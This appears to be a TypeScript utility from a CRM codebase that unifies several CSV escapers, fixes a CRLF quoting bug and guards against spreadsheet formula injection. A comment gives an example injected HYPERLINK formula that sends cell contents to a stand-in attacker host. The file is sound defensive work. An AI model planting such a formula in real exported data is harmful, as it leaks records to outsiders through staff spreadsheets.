/**
 * The one CSV escaper.
 *
 * There were four near-copies of this in the repo, and they had drifted:
 *   packages/ui/src/data-table/export-csv.ts        escapeCsv      [",\n\r]
 *   apps/crm/src/lib/crm/record-csv-export.ts       escapeCsvCell  [",\n\r] + JSON objects
 *   apps/crm/src/app/api/commissions/export/route.ts csvEscape     [",\n\r]
 *   apps/crm/src/app/api/crm/export/route.ts        escapeCsvField , " \n  ← no \r
 *
 * The last one produced CORRUPT CSV for any field containing a CRLF: the bare
 * `\r` was written unquoted, so every downstream parser saw a premature row
 * break. Notes and address fields pasted from Windows carry CRLF routinely.
 *
 * None of the four neutralised formula injection.
 */

/** Excel-friendly UTF-8 byte-order mark. Prepend to a full document, not a cell. */
export const CSV_UTF8_BOM = '﻿';

/**
 * Characters that make a spreadsheet treat a cell as a formula rather than text.
 * A cell beginning with one of these is prefixed with a single quote so Excel,
 * Google Sheets and LibreOffice render it literally.
 *
 * Without this, an attacker-controlled record field such as
 * `=HYPERLINK("https://evil.example/?"&A1,"Click")` executes when a staff member
 * opens an export — the classic CSV-injection path out of a CRM.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Escape one value for CSV.
 *
 * - null/undefined → empty string
 * - objects → JSON (so a JSONB column exports readably rather than "[object Object]")
 * - quotes doubled, and the cell quoted when it contains a comma, quote, CR or LF
 * - leading formula characters neutralised with a `'` prefix
 */
export function escapeCsvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let str = typeof value === 'object' ? JSON.stringify(value) : String(value);

  // Formula injection: guard before quoting, so the prefix ends up inside the
  // quoted cell rather than outside it.
  if (str.length > 0 && FORMULA_PREFIXES.includes(str[0])) {
    str = `'${str}`;
  }

  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Join one row's already-raw values into a CSV line. */
export function toCsvRow(values: unknown[]): string {
  return values.map(escapeCsvCell).join(',');
}
